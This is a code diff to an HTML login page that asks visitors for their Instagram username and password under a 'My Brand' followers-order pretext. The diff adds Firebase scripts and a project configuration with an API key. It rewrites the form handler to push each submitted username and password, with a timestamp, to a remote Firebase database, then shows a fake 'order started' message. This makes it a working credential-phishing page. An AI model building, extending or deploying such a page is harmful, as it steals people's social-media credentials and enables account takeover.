@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Login | My Brand</title>
-  <link rel="stylesheet" href="style.css"/>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <nav>
@@ -20,26 +20,48 @@
   <section class="form-section">
     <h2>Login with Instagram</h2>
     <form id="loginForm">
-      <input type="text" placeholder="Instagram Username" id="username" required />
-      <input type="password" placeholder="Instagram Password" id="password" required />
+      <input type="text" id="username" placeholder="Instagram Username" required />
+      <input type="password" id="password" placeholder="Instagram Password" required />
       <button type="submit">Login</button>
     </form>
   </section>
 
-  <script>
-    const form = document.getElementById("loginForm");
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
+  <script>
+    // Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyAw59s8GAG1OnrrZ_-V2Km5r0yvVFq-JSQ",
+      authDomain: "ak-followers.firebaseapp.com",
+      projectId: "ak-followers",
+      storageBucket: "ak-followers.firebasestorage.app",
+      messagingSenderId: "704615666904",
+      appId: "1:704615666904:web:9b9ce8dd77157ac201b3ad",
+      databaseURL: "https://ak-followers-default-rtdb.firebaseio.com" // Add this manually
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Handle form submission
+    const form = document.getElementById("loginForm");
     form.addEventListener("submit", function(e) {
       e.preventDefault();
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
 
-      const data = { username, password };
-      localStorage.setItem("loginData", JSON.stringify(data));
+      db.ref("logins").push({
+        username: username,
+        password: password,
+        timestamp: new Date().toISOString()
+      });
 
-      alert(`✅your order process has started it will be completed within 24 hours!\nUsername: ${username}\nPassword: ${password}`);
+      alert("✅ Your order process has started. It will be completed within 24 hours!");
       form.reset();
     });
   </script>
 </body>
-</html>
+    </html>
